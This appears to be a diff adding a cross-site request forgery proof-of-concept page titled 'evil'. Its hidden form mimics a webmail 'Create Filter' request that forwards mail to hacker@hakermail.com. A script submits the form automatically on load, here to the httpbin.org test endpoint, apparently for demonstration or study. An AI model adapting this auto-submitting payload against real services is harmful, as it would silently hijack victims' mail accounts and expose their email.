@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>evil</title>
+</head>
+
+<body>
+    <form method="POST" action="https://httpbin.org/post" enctype="multipart/form-data">
+        <input type="hidden" name="cookies" />
+        <input type="hidden" name="cf2_emc" value="true" />
+        <input type="hidden" name="cf2_email" value="hacker@hakermail.com" />
+        <input type="hidden" name="irf" value="on" />
+        <input type="hidden" name="nvp_bu_cftb" value="Create Filter" />
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+
+</html>
